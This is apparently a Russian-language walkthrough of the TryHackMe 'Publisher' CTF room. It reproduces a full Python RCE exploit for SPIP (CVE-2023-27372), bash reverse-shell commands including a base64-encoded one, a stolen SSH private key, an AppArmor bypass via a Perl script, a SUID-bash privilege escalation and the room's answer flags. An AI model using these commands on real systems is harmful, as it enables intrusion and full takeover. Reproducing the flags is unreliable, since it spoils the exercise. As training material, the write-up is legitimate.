[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Publisher](https://tryhackme.com/r/room/publisher) 

Всего 1 задание:
## Задание 1
Машина CTF "Publisher" представляет собой смоделированную среду, в которой размещены некоторые службы. С помощью 
ряда методов перечисления, включая нечеткий анализ каталогов и идентификацию версий, обнаружена уязвимость, 
позволяющая выполнять удаленное выполнение кода (RCE). Попытки повысить привилегии с помощью пользовательского 
двоичного файла затруднены ограниченным доступом к критически важным системным файлам и каталогам, что требует более 
глубокого исследования профиля безопасности системы, чтобы в конечном итоге использовать лазейку, которая позволяет 
выполнять неограниченную оболочку bash и добиться повышения привилегий.

### Ответить на вопросы ниже
Что такое флаг пользователя?
```commandline
fa229046d44eda6a3598c73ad96f4ca5
```

Что такое корневой флаг?
```commandline
3a4225cc9e85709adda6ef55d6a4f2ca
```

## Подробное решение комнаты
### 1. Подключаемся по VPN
Нажимаем на кнопку "Start Machine" на странице комнаты сразу под шапкой задания Task 1 Publisher
#### 1.1. Можно подключится через собственную консоль на вашей личной kali linux
Для этого в консоли используем программу openvpn и указываем ей путь на ваш ключ openvpn
```commandline
openvpn /home/kali/Documents/THM-openvpn/andrej.marinchenko.ovpn
```

после того как соединение будет установлено проверяем полученный ip адрес командой 

```commandline
ip a
```
в моем случае это - 10.9.0.218

#### 1.2. Можно подключится к kali linux через веб-интерфейс (удаленный рабочий стол) try hack me
после того как соединение будет установлено проверяем полученный ip адрес командой

```commandline
ip a
```
в моем случае это - 10.9.0.218
#### 1.3. На странице комнаты смотрим адрес нашей цели (машину которую необходимо взломать) 
в моем случае target 10.10.175.180

--------------------------------------------------------------------
### 2.проведем сканирование целевой машины командой:
```commandline
nmap -sS 10.10.175.180
```
получим результат:
```commandline
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 07:17 EDT
Nmap scan report for 10.10.207.169
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

--------------------------------------------------------------------
таким образом мы имеем дело с сайтом по 80 порту, просканируем его командой:
```commandline
gobuster dir -u 10.10.175.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
получим результат:
```commandline
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.175.180
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.10.175.180/images/]
/spip                 (Status: 301) [Size: 313] [--> http://10.10.175.180/spip/]
/server-status        (Status: 403) [Size: 278]
Progress: 220560 / 220561 (100.00%)
======================================================== =======
Finished
===============================================================
```

В данном случае нас конкретно интересует только адрес http://10.10.175.180/spip/, который указывает на специфическую 
библиотеку spip.

--------------------------------------------------------------------
Проведем поиск в google - spip exploit
переходим на страницу - https://www.exploit-db.com/exploits/51536
и находим уже написанный на питоне эксплойт, которым и воспользуемся, для этого создаем файл командой:
```commandline
nano exploit.py
```

ниже я продублировал содержимое этого файла, которые вы также должны вставить в свой создаваемый:
```commandline
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)
# Google Dork: inurl:"/spip.php?page=login"
# Date: 19/06/2023
# Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372)
# Vendor Homepage: https://www.spip.net/
# Software Link: https://files.spip.net/spip/archives/
# Version: < 4.2.1 (Except few fixed versions indicated in the description)
# Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0
# CVE reference : CVE-2023-27372 (coiffeur)
# CVSS : 9.8 (Critical)
#
# Vulnerability Description:
#
# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.
#
# Usage: python3 CVE-2023-27372.py http://example.com

import argparse
import bs4
import html
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    return parser.parse_args()

def get_anticsrf(url):
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        csrf_value = csrf_input['value']
        if options.verbose:
            print("[+] Anti-CSRF token found : %s" % csrf_value)
        return csrf_value
    else:
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        print("[+] Execute this payload : %s" % payload)
    return 0

if __name__ == '__main__':
    options = parseArgs()

    requests.packages.urllib3.disable_warnings()
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    try:
        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass

    csrf = get_anticsrf(url=options.url)
    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
```

т.к. мы имеем дело с скриптовым языком python и конкретно в этом скрипте используются функции с внешних библиотек, 
то подгружаем эти библиотеки, для ускорения этого процесса создадим список необходимых библиотек командой:
```commandline
nano  requirements.txt
```
содержимое этого файла будет:
```commandline
argparse
bs4
requests
```
для автоматического запуска установки всех библиотек выполним команду
```commandline
pip install -r requirements.txt
```

### 3. на этом этапе мы попробуем скачать с нашей kali linux реверс-шел и в дальнейшем подключится через него.
--------------------------------------------------------------------
для этого создадим сам реверс шел, командой:
```commandline
nano reverse.sh
```
содержимое этого реверс шела:
```commandline
/bin/bash -i >& /dev/tcp/10.9.0.218/4444 0>&1
```

после этого на нашей kali linux запустим порт 4444 для прослушивания внешних подключений через netcat или сокращенно nc
```commandline
nc -lvnp 4444
```

переходим на нашей машине с kali linux в директорию где мы сохранили реверс шел и запускаем свой веб-сервер:

```commandline
cd Documents/01.publisher
python3 -m http.server 80
python exploit.py -h
```

после чего на целевой машине выполняем команду подключения к нашей кали линукс с передачей управления
```commandline
python exploit.py -u 'http://10.10.175.180/spip/' -c 'curl http://10.9.0.218/reverse.sh | bash' -v
```
скрипт отработал, но управление мы так и не получили.... Но этот шаг я специально так подробно описал что бы 
появилось понятие как должен работать реверс шел. Сначало Вы запускаете на своей машине порт для прослушивания, к  
котором потом подключаемся с целевой машины.

### 4. А теперь давайте добъемся подключения к нашей машине с машины жертвы, для этого:
-----------------------------------------------------------------------
загуглим как это сделать запросом google - bash reverse shell one line
перейдем по ссылке:
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

найдем строку:
```commandline
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
которая и является нашим реверс шелом, но на этот раз для нее мы не будем создавать отдельный файл, а попробуем 
сразу запустить на исполнение командой:
```commandline
bash -i >& /dev/tcp/10.9.0.218/4444 0>&1
```
код отработал, но подключение мы не получили, для этого нужно наш реверс-шел закодировать, при этом кодировку берем 
`base64` а для этого перейдем на соотв. страницу используя тот же поисковик google найдем - cyberchef
перейдем на страницу https://gchq.github.io/CyberChef/ и в окне поиска введем необходимую кодировку
```commandline
to base64
```
в окне `input` введем наш реверс шел:

```commandline
bash -i >& /dev/tcp/10.9.0.218/4444 0>&1
```
и в окне `output` получим уже закодированный в base64 реверс шел:
```commandline
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjAuMjE4LzQ0NDQgMD4mMQ==
```
таким образом наша итоговай команда будет выглядеть вот таким образом:
```commandline
python exploit.py -u 'http://10.10.175.180/spip/' -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjAuMjE4LzQ0NDQgMD4mMQ== | base64 -d | bash' -v
```
отлично мы подключились, проверим допустимые нам права и под какой учеткой мы работаем:
```commandline
ls
id 
whoami
www-data@41c976e507f8:/home/think/spip/spip$ whoami
whoami
www-data
```
получим первый флаг
```commandline
www-data@41c976e507f8:/home/think/spip/spip$ ls /home
ls /home
think
www-data@41c976e507f8:/home/think/spip/spip$ ls /home/think
ls /home/think
spip
user.txt
www-data@41c976e507f8:/home/think/spip/spip$ cat /home/think/user.txt
cat /home/think/user.txt
fa229046d44eda6a3598c73ad96f4ca5  
```

### 5. Подключимся по ssh к целевой машине
для этого необходимо получить соответствующий ключ:
```commandline
ls -la /home/think
ls -la /home/think/.ssh
cat /home/think/.ssh/id_rsa
```
скопируем полученное содержимое в свой файл:
```commandline
nano id_rsa
```
для ясности, содержимое нашего ключа:
```commandline
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

для того что бы ключик заработал, установим для него соответствующие права и подключимся по ssh:
```commandline
chmod 600 id_rsa
ssh -i id_rsa think@10.10.175.180
yes
id 
sudo -l
ps -p $$
cat /etc/shells
```

### 6. Эскалация привилегий
для этого в поиске найдем google -  suid enumeration find и перейдем по ссылке
https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

найдем файлы которые выполняются с максимальными привилегиями суперпользователя:
```commandline
find / -perm -u=s -type f 2>/dev/null
```
получим вот такой список, давайте внимательно на него посмотрим:
```commandline
think@publisher:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

меня заинтересовал вот этот файл:
```commandline
/usr/sbin/run_container
```
как же нам его переделать так, что бы мы получили права супер пользователя? Для этого нужно будет запустить этот 
исполняемый файл, но перед этим изменить тот скрипт который он запускает в наших интересах, а именно скопировать 
бинарный шел код, который мы можем запустить с привилегиями супер пользователя. Для этого изучим, а в какой сейчас 
оболочке мы работаем и какие права на чтения и запись имеет эта оболочка:
```commandline
ps -p $$
ls -la /opt
ls /etc/apparmor.d
cat /etc/apparmor.d/usr.sbin.ash

# Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,
```


посмотрим, а сможем ли мы изменить запускаемый скрипт, командой:

```commandline
nano /opt/run_container.sh
```
увы, но нет.... ок, тогда найдем, что именно запускает этот код:
```commandline
strings /usr/sbin/run_container | grep run

/opt/run_container.sh
run_container.c
```

зная какую оболочку мы используем `ash` а также место расположения скрипта, который нам предстоит модифицировать, 
найдем пути повышения привилегий, путем поиска в google - hacktricks apparmor, перейдем по ссылке:
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor
где найдем вот такой код, для выполения под Perl:
```commandline
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /tmp/test.pl
chmod +x /tmp/test.pl
/tmp/test.pl
```

но, ном нужно будет его немого изменить, т.к. права сохранять файлы во временной директории у нас нет, получим:
```commandline
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```
после запуска в командной строке, проверим кто мы сейчас:
```commandline
id 
whoami
```
мы конечно еще не супер пользователь, но уже запустили полноценную оболочку `bash` и можем изменить целевой скрипт

```commandline
ls -la /opt/run_container.sh
nano /opt/run_container.sh
```
а для того что бы мы получили нашу оболочку с супер пользователя, скопируем этот бинарный исполняемый файл, путем 
добавления всего двух строчек в начале этого скрипта /opt/run_container.sh
```commandline
cp /usr/bin/bash  /tmp/bash
chmod +s /tmp/bash
```
а теперь запустим исполняемый файл:
```commandline
/usr/sbin/run_container
```
разумеется этот файл, был изначально предназначен для запуска контейнера и полностью свою работу не выполнит, но нам 
и не нужно полностью, т.к. наши две строчки тихо выполняться в начале скрипта и скопируют наш баш бинарный файл во 
временную директорию, перейдем и запустим его:
```commandline
$ cd /tmp
$ ./bash -p
```
убеждаемся, что мы теперь можем выполнять команды от имени супер пользователя:
```commandline
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
bash-5.0# whoami
root
```

### 7. получим искомый флаг супер пользователя:
```commandline
bash-5.0# ls /root
root.txt  spip
bash-5.0# cat /root/root.txt
3a4225cc9e85709adda6ef55d6a4f2ca  
```





[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)